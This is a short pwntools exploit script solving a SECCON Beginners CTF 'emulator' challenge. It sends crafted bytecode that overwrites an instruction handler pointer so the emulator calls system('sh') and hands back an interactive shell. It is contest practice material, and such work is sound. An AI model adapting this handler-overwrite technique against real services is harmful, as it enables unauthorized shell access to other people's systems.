#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "emulator.quals.beginners.seccon.jp"
PORT = 4100
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

def exploit():
	
	# plt_system = 0x4010d0
	mvi_a	= b"\x3e"
	mvi_b	= b"\x06"
	mvi_c	= b"\x0e"
	mvi_h   = b"\x26"
	mvi_l   = b"\x2e"
	mvi_m	= b"\x36"
	
	payload = b""
	
	payload += mvi_h
	payload += b"\x40"		
	payload += mvi_l
	payload += b"\x04"		
	payload += mvi_m
	payload += b"\xd0"		 
	payload += mvi_l		 
	payload += b"\x05"
	payload += mvi_m
	payload += b"\x10"		
	payload += mvi_a
	payload += b"s"
	payload += mvi_b
	payload += b"h"
	payload += mvi_c
	payload += b"\x00"
	payload += b"\x00"		#emu->instruction[0x00](emu) ---> plt_system("sh\x00")
	payload += b"\xc9\n"

	conn.sendlineafter("memory...\n", payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
